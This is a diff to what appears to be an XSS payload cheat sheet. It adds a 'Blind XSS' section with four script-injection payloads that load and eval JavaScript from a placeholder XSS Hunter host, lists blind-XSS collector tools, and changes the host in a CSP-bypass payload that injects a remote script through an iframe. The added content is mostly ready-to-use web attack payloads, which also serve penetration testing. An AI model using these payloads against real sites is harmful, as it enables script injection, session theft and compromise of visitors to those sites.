@@ -7,6 +7,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
 - [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
+- [Blind XSS](#blind-xss)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
 - [CSP Bypass](#csp-bypass)
@@ -298,6 +299,31 @@ div  {
   </body>
 </html>
 ```
+
+## Blind XSS
+
+### XSS Hunter
+
+Available at [https://xsshunter.com/app](https://xsshunter.com/app)
+
+> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
+
+```javascript
+"><script src=//yoursubdomain.xss.ht></script>
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursubdomain.xss.ht\';document.body.appendChild(a)')
+
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yoursubdomain.xss.ht");a.send();</script>
+
+<script>$.getScript("//yoursubdomain.xss.ht")</script>
+```
+
+### Other tools for Blind XSS
+
+- [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
+- [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
+- [BlueLotus_XSSReceiver - FiresunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
+- [ezXSS - ssl](https://github.com/ssl/ezXSS)
 
 ## Polyglot XSS
 
@@ -751,7 +777,7 @@ window.frames[0].document.head.appendChild(script);
 ### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
 
 ```js
-d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://swk.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://yoursubdomain.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
 
 ### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
